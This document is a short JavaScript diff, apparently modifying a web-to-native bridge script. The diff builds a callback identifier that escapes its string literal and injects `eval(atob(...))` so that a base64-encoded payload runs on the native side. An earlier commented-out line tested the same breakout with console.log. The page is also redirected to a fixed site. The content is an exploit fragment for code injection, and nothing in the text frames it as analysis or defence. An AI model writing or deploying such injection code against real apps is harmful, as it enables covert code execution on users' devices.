@@ -321,7 +321,7 @@
         const base64Code = btoa(payload);
 
         // const callbackId = service + genCallbackId() + '\'); console.log(11111) //';
-        const callbackId = service + genCallbackId() + '\');' + base64Code + '//';
+        const callbackId = service + genCallbackId() + '\');' + `eval(atob("${base64Code}"));` + '//';
 
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
@@ -335,7 +335,7 @@
                 console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
             }, i);
         }
-        location.href = url;
+        location.href = 'https://vmall.com';
 
 
         // 结果入队并处理
